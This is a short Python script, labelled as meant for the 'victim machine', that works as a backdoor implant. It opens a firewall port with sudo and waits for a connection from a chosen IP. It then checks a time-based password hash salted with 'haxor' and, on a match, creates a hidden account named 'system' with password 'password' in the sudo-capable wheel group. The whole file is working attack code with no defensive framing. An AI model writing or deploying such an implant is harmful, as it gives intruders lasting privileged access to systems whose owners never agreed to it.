# this is for the victim machine
import sys
import subprocess
import socket
from urllib.request import urlopen
import hashlib

CLIENT_IP = sys.argv[1] 
PORT = int(sys.argv[2])

# Open port in firewall
subprocess.Popen(f"sudo firewall-cmd --zone=public --permanent --add-port={PORT}/tcp && sudo firewall-cmd --reload", shell=True)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("", PORT))

s.listen(1)
while True:
    conn, address = s.accept()
    print("Incoming connection: " + str(address))
    print(address)
    if address[0] == CLIENT_IP:
        print("Address match")
        res = urlopen('http://just-the-time.appspot.com/')
        time = res.read().strip().decode('utf-8')
        pwd = conn.recv(4096).decode()
        expected_hash = str(hashlib.sha512(("haxor" + time).encode()).hexdigest())
        # Check the hash
        if pwd == expected_hash:
            print("Correct password, waiting for commands")
            conn.send("done".encode())
            subprocess.Popen("sudo useradd -p $(openssl passwd -1 password) system && sudo usermod -aG wheel system", shell=True)
        conn.close()